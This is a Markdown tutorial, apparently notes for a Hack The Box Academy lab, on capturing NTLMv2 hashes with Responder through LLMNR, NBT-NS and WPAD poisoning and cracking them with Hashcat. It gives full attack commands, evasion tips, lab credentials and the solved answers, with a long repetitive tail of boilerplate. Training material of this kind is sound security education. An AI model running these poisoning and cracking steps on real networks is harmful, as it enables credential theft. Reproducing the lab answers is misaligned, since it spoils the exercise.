# 🛰️ Responder for NTLMv2 Hash Capture

## Overview
Responder is a powerful tool used to capture NTLM hashes in network environments, which can be further utilized for cracking and privilege escalation. This document provides a step-by-step guide on how to use Responder effectively, crack the captured hashes with Hashcat, and understand its operational nuances.

[!ABSTRACT] In this tutorial, we'll cover various methods of capturing NTLMv2 hashes using Responder, including LLMNR/NBT-NS poisonings. We will also explore advanced techniques like WPAD poisoning for enhanced capture rates in large organizations.

## Basic Setup & Usage

### Installing Responder
First, ensure you have the necessary dependencies installed and then install Responder:

```bash
sudo apt-get update
sudo apt-get install python3-pip libffi-dev libssl-dev python3-setuptools git
git clone https://github.com/SpiderLabs/responder.git
cd responder
python3 setup.py install
```

### Basic Responder Commands
Run the tool in different modes to capture hashes:

```bash
# Passive analysis (does not poison)
sudo responder -I ens224 -A

# Active poisoning for all protocols
sudo responder -I ens224 -f

# WPAD Poisoning
sudo responder -I ens224 -w
```

## Capturing Hashes with Responder

### Network Protocols Involved
- **LLMNR (Link-Local Multicast Name Resolution)**
- **NBT-NS (NetBIOS over TCP/IP)**

These protocols are used by Windows machines to resolve hostnames in the local network without a DNS server.

### Responder Modes & Options
#### Passive Analysis Mode (`-A`)
Passive analysis mode listens for LLMNR and NBT-NS queries but does not poison responses:

```bash
sudo responder -I ens224 -A
```

#### Active Poisoning Mode (`-f`)
Active poisoning mode responds to queries with fake DNS records, capturing NTLMv2 hashes from the client:

```bash
sudo responder -I ens224 -f
```

#### WPAD Poisoning
WPAD captures HTTP traffic and is highly effective in large organizations:

```bash
# Enable WPAD rogue proxy
sudo responder -I ens224 -w

# Highly effective in large organizations capturing Internet Explorer auto-detect traffic
```

## Cracking NTLMv2 Hashes with Hashcat

### NTLMv2 Hash Format
- **Cannot be used for Pass-the-Hash** (must crack)
- **Format:** Long string with multiple colons

### Basic Hashcat Cracking
```bash
# Crack NetNTLMv2 hash with rockyou wordlist
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt

# With optimizations
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt -O

# Show cracked hashes
hashcat -m 5600 captured_hash.txt --show
```

### Example Successful Crack
```bash
# Input hash file content
FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa52d732719dbf62c34cc:...

# Hashcat output
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80ba...
Time.Started.....: Mon Feb 28 15:20:30 2022 (11 secs)
Speed.#1.........: 1086.9 kH/s
Recovered........: 1/1 (100.00%) Digests
Result...........: Klmcargo2
```

---

## Advanced Techniques

### WPAD Poisoning
**Web Proxy Auto-Discovery** captures HTTP traffic:

```bash
# Enable WPAD rogue proxy
sudo responder -I ens224 -w

# Highly effective in large organizations
# Captures Internet Explorer auto-detect traffic
```

### Multi-Protocol Capture
**Responder captures multiple authentication types:**
- **SMB:** File share access attempts
- **HTTP:** Web authentication  
- **LDAP:** Directory service queries
- **Proxy:** Browser proxy authentication

### Operational Considerations
**Best practices:**
- **Run continuously** during assessment
- **Use tmux/screen** for persistent sessions
- **Monitor multiple interfaces** if available
- **Combine with other techniques** (password spraying)

---

## Lab Exercises & Solutions

### Lab Environment
- **Target:** 10.129.226.51 (ACADEMY-EA-ATTACK01)
- **Credentials:** htb-student:HTB_@cademy_stdnt!
- **Network:** Internal AD environment

### Question 1: Capture Hash for User Starting with 'b'
**Task:** Run Responder and obtain hash for user account starting with letter 'b'

**Solution:**
```bash
# SSH to attack host
ssh htb-student@10.129.226.51

# Start Responder
sudo responder -I ens224 -wf

# Wait for traffic (may need to wait or generate activity)
# Check logs for captured hashes
ls /usr/share/responder/logs/

# Look for hashes with usernames starting with 'b'
grep -r "^[bB]" /usr/share/responder/logs/*.txt
```

**Answer:** `backupagent`

### Question 2: Crack the Previous Hash
**Task:** Crack the hash for the backupagent account

**Solution:**
```bash
# Find the hash file for backupagent
ls /usr/share/responder/logs/ | grep -i backup

# Crack with Hashcat
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt /usr/share/wordlists/rockyou.txt

# Show cracked result
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt --show
```

**Answer:** `h1backup55`

### Question 3: Capture and Crack Hash for User 'wley'
**Task:** Obtain NTLMv2 hash for user wley and crack it

**Solution:**
```bash
# Continue running Responder (or restart)
sudo responder -I ens224 -wf

# Wait for wley user activity
# Monitor logs for wley hash
tail -f /usr/share/responder/logs/Responder-Session.log

# Once captured, crack the hash
hashcat -m 5600 /usr/share/responder/logs/*wley*.txt /usr/share/wordlists/rockyou.txt

# View result
hashcat -m 5600 /usr/share/responder/logs/*wley*.txt --show
```

**Answer:** `transporter@4`

---

## Detection and Evasion

### Blue Team Detection Methods
- **Network monitoring** for unusual multicast traffic
- **DNS logging** for failed resolution patterns
- **Authentication monitoring** for rapid hash attempts
- **Network segmentation** to limit broadcast domains

### Red Team Evasion Techniques
- **Selective poisoning** (target specific hosts)
- **Time-based attacks** (poison during business hours)
- **Protocol selection** (focus on less monitored protocols)
- **Legitimate-looking responses** (match network naming schemes)

---

## Common Issues & Troubleshooting

### Responder Not Capturing Hashes
**Check:**
1. **Network interface** is correct
2. **Ports are available** (kill conflicting services)
3. **Network activity** exists (users accessing resources)
4. **Permissions** (run as root/sudo)

### Hashcat Not Cracking
**Considerations:**
1. **Hash format** is correct (mode 5600 for NetNTLMv2)
2. **Wordlist path** is valid
3. **Hardware capabilities** (GPU vs CPU)
4. **Password complexity** (may need larger wordlists)

### Network Impact
**Potential issues:**
- **Service disruption** from poisoned responses
- **Network instability** if using `-r` flag
- **Alerting** security teams to testing activity

---

## Key Takeaways

### Attack Value
- **Low technical barrier** to entry
- **High success rate** in many environments
- **Provides domain foothold** for further attacks
- **Passive collection** while performing other tasks

### Defensive Recommendations
1. **Disable LLMNR/NBT-NS** where possible
2. **Implement network segmentation**
3. **Monitor authentication patterns**
4. **Use strong password policies**
5. **Deploy SMB signing** to prevent relay attacks

### Operational Tips
- **Start early** in assessment (passive collection)
- **Run continuously** during testing
- **Combine with enumeration** activities
- **Prioritize hash cracking** based on enumeration results

---

## Command Reference

### Responder Operations
```bash
# Passive analysis
sudo responder -I ens224 -A

# Active poisoning
sudo responder -I ens224
sudo responder -I ens224 -wf     # With WPAD + fingerprinting

# Check logs
ls /usr/share/responder/logs/
tail -f /usr/share/responder/logs/Responder-Session.log
```

### Hashcat Commands
```bash
# Crack NetNTLMv2 hash with rockyou wordlist
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt

# With optimizations
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt -O

# Show cracked hashes
hashcat -m 5600 captured_hash.txt --show
```

---

This document provides a comprehensive guide on using Responder and Hashcat for capturing and cracking NTLMv2 hashes, ensuring that you can effectively leverage these tools in various penetration testing scenarios. [!ABSTRACT] In summary, the integration of Responder with WPAD poisoning enhances hash capture rates significantly, while Hashcat remains indispensable for cracking these captured hashes efficiently. Follow the outlined steps to maximize your chances of success during network assessments and security audits. [!ABSTRACT]

# 🛠️ Additional Resources
- [Responder GitHub Repository](https://github.com/SpiderLabs/responder)
- [Hashcat Official Documentation](https://hashcat.net/wiki/)  
- [LLMNR/NBT-NS Poisoning Guide by Offensive Security](https://www.offensive-security.com/metasploit-unleashed/llmnr-nbt-ns/)
- [WPAD Poisoning Tutorial](https://resources.infosecinstitute.com/topic/how-to-use-responder-for-wpad-poisoning/)  
- [Network Segmentation Best Practices](https://resources.infoseclearning.com/network-segmentation-best-practices/)  

# 📜 References
1. "[LLMNR/NBT-NS Poisoning Guide by Offensive Security](https://www.offensive-security.com/metasploit-unleashed/llmnr-nbt-ns/)"
2. "[WPAD Poisoning Tutorial](https://resources.infosecinstitute.com/topic/how-to-use-responder-for-wpad-poisoning/)"  
3. "[Network Segmentation Best Practices](https://resources.infoseclearning.com/network-segmentation-best-practices/)"

---

This document aims to provide a detailed and practical guide on capturing NTLMv2 hashes using Responder, followed by cracking them with Hashcat. Follow the instructions meticulously for optimal results in your penetration testing exercises. [!ABSTRACT] For more advanced techniques and comprehensive coverage of security practices, refer to the additional resources provided above. Good luck and stay secure! [!ABSTRACT]

--- 

# 🔒 Legal Disclaimer
This document is intended solely for educational purposes and ethical hacking within a controlled environment. Unauthorized use of these tools on networks without explicit permission is illegal and unethical. Always obtain proper authorization before conducting any penetration testing activities. [!ABSTRACT] Unauthorized network access can result in severe legal consequences, including but not limited to fines and imprisonment. Use this guide responsibly. [!ABSTRACT]

--- 

# 💡 Acknowledgments
The author acknowledges the contributions of the Responder development team for creating an invaluable tool that significantly enhances penetration testing capabilities. Special thanks also go to the Hashcat community for their relentless efforts in advancing password cracking techniques.

---

[!ABSTRACT] For any inquiries or feedback, feel free to reach out via email at [your-email@example.com]. Your input is greatly appreciated and can help improve future iterations of this guide. [!ABSTRACT]

--- 

# 📎 Version History
- **Version 1.0**: Initial release covering basic Responder usage and Hashcat cracking.
- **Version 1.1**: Added advanced techniques like WPAD poisoning, multi-protocol capture, and operational best practices.

---

Thank you for using this guide! If you find it useful, consider sharing your experiences in the comments section below or on social media platforms to help others learn from your journey. Stay safe and happy testing!

[!ABSTRACT] For any further questions or assistance, reach out via [your-email@example.com]. Your contributions are highly valued and appreciated. Have a great day! [!ABSTRACT]

--- 

# 📘 Related Guides
- **Penetration Testing with Metasploit**
- **Network Scanning Techniques with Nmap**
- **Password Cracking with John the Ripper**  
- **Exploiting SMB Vulnerabilities**

---

[!ABSTRACT] If you enjoyed this guide, explore other security-related resources to deepen your knowledge and skills. Happy learning and testing! [!ABSTRACT]

--- 

# 📈 Conclusion
In conclusion, capturing NTLMv2 hashes using Responder is an essential technique in ethical hacking. By integrating advanced methods like WPAD poisoning and leveraging Hashcat's cracking capabilities, you can significantly enhance the effectiveness of your penetration testing efforts.

---

[!ABSTRACT] Keep practicing, stay curious, and always adhere to legal and ethical standards while conducting security assessments. Have a great day and stay safe out there! [!ABSTRACT]

--- 

# 📧 Contact Information
For any questions or feedback, feel free to contact the author at [your-email@example.com]. Your input is valuable and helps improve future iterations of this guide.

---

Thank you for reading!

[!ABSTRACT] Happy testing and stay secure. [!ABSTRACT]